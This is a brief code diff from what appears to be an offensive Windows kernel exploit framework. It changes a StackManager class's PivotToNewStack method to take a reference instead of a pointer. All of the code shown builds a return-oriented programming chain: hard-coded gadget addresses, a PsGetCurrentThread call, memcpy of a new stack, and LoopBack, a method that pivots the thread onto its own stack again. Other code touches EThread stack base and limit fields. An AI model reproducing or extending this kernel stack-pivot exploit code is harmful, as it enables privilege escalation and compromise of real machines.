@@ -95,7 +95,7 @@ void StackManager::ModifyThreadStackBaseAndLimit(const std::uint64_t NewStackBas
 	this->ModifyThreadField(EThreadStackLimitOffset, NewStackLimit);
 }
 
-void StackManager::PivotToNewStack(StackManager* NewStack)
+void StackManager::PivotToNewStack(StackManager& NewStack)
 {
     this->AddFunctionCall("PsGetCurrentThread");
     this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
@@ -158,10 +158,10 @@ void StackManager::PivotToNewStack(StackManager* NewStack)
 
     this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
     this->AddPadding(0x10);
-    this->AddValue((std::uint64_t)NewStack->StackAllocAddress, "src address");
+    this->AddValue((std::uint64_t)NewStack.StackAllocAddress, "src address");
     this->AddPadding(0x8);
     this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
-    this->AddValue(NewStack->StackSizeLimit, "count value");
+    this->AddValue(NewStack.StackSizeLimit, "count value");
     this->AddPadding(0x28);
     this->AddFunctionCall("memcpy");
 
@@ -225,5 +225,5 @@ void StackManager::PivotToNewStack(StackManager* NewStack)
 
 void StackManager::LoopBack()
 {
-    this->PivotToNewStack(this);
+    this->PivotToNewStack(*this);
 }
